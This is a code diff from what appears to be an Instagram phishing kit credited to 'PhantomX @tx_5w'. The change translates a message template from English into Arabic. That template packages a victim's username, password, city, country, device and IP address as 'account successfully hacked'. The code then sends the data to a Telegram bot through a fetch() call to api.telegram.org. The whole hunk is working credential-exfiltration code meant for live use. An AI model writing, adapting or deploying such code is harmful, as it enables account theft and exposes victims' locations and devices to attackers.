@@ -236,15 +236,15 @@
                 const deviceInfo = getDeviceInfo();
 
                 // بناء الرسالة
-               const message = `🔓 *The account was successfully hacked by PhantomX.* 🔓\n\n` +
-                                `💻 *Account information:* 💻\n` +
-                                `📧 Username, number, or email: ${username}\n` +
-                                `🔑 Password: ${password}\n\n` +
-                                `🌍 *Location:* ${locationData.city}, ${locationData.country}\n` +
-                                `📱 *Device:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
+                const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
+                                `💻 *معلومات الحساب:* 💻\n` +
+                                `📧 اليوزر او الرقم او البريد الإلكتروني: ${username}\n` +
+                                `🔑 كلمة المرور: ${password}\n\n` +
+                                `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
+                                `📱 *جهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
                                 `📲 *IP:* ${locationData.ip}\n\n` +
-                                `Hacked by PhantomX @tx_5w`
-                                `Account type: Instagram☣`;
+                                `الاختراق تم بواسطة PhantomX @tx_5w`;
+
                 // إرسال الرسالة إلى قناة تليجرام
                 const telegramChannel = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message);
                 fetch(telegramChannel).then(response => {
